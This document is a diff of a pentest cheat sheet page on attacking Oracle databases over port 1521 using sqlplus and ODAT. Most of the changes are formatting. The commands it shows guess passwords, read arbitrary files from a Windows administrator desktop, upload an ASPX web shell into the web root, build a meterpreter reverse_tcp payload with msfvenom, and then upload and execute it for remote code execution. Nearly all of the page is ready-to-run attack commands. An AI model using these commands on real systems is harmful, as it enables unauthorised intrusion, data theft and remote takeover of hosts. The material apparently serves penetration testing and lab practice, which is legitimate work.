@@ -10,8 +10,6 @@ tags: ["oracle", "database", "1521", "sqlplus", "odat", "revshell", "rce"]
 {{< tab set1 tab2 >}}ODAT{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-<div>
-
 ```console
 # Install
 sudo apt install oracle-instantclient-sqlplus
@@ -27,12 +25,8 @@ export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_
 sqlplus -V
 ```
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
-
-<div>
 
 ```console
 # Install
@@ -44,19 +38,13 @@ sudo apt install odat
 odat --version
 ```
 
-</div>
-
 <small>*Ref: [Download ODAT](https://github.com/quentinhardy/odat)*</small>
 
 {{< /tabcontent >}}
 
-<br>
-
 ---
 
 ### Enum
-
-<div>
 
 ```console
 # SID enum (You only need one)
@@ -70,14 +58,10 @@ odat passwordguesser -s <TARGET> -d <SID> --accounts-file accounts.txt
 
 ```console
 # Run all checks with creds as sysdba
-odat all -s <TARGET> -U <USER> -P '<PASSWORD>' -d <SID> --sysdba
+odat all -s <TARGET> -U '<USER>' -P '<PASSWORD>' -d <SID> --sysdba
 ```
 
-</div>
-
 ### General
-
-<div>
 
 ```console
 # Export everytime or add to ~/.zshrc
@@ -99,34 +83,21 @@ sqlplus '<USER>/<PASSWORD>@<TARGET>:1521/<SID>' as sysdba
 select * from user_role_privs;
 ```
 
-</div>
-
-<br>
-
 ---
-#### Arbitrary Read
 
-<div>
-
-```console
-odat ctxsys -s <TARGET> -U <USER> -P '<PASSWORD>' -d <SID> --sysdba --getFile c:\\users\\administrator\\desktop\\file.txt
-```
-
-</div>
-
-#### Upload File to RCE
-
-<div>
+### Abuse #1: Arbitrary Read
 
 ```console
-odat dbmsadvisor -s <TARGET> -U <USER> -P '<PASSWORD>' -d <SID> --sysdba --putFile C:\\inetpub\\wwwroot cmdasp.aspx /usr/share/webshells/aspx/cmdasp.aspx
+odat ctxsys -s <TARGET> -U '<USER>' -P '<PASSWORD>' -d <SID> --sysdba --getFile c:\\users\\administrator\\desktop\\file.txt
 ```
 
-</div>
+### Abuse #2: Upload File to RCE
 
-#### Execute binary to RCE
+```console
+odat dbmsadvisor -s <TARGET> -U '<USER>' -P '<PASSWORD>' -d <SID> --sysdba --putFile C:\\inetpub\\wwwroot cmdasp.aspx /usr/share/webshells/aspx/cmdasp.aspx
+```
 
-<div>
+### Abuse #3: Execute binary to RCE
 
 ```console
 # Create a malicious exe
@@ -135,14 +106,10 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PO
 
 ```console
 # Upload
-odat utlfile -s <TARGET> -U <USER> -P '<PASSWORD>' -d <SID> --sysdba --putFile \\Temp revshell.exe revshell.exe
+odat utlfile -s <TARGET> -U '<USER>' -P '<PASSWORD>' -d <SID> --sysdba --putFile C:\\ProgramData revshell.exe revshell.exe
 ```
 
 ```console
 # Execute
-odat externaltable -s <TARGET> -U <USER> -P '<PASSWORD>' -d <SID> --sysdba --exec \\Temp revshell.exe
+odat externaltable -s <TARGET> -U '<USER>' -P '<PASSWORD>' -d <SID> --sysdba --exec C:\\ProgramData revshell.exe
 ```
-
-</div>
-
-<br>
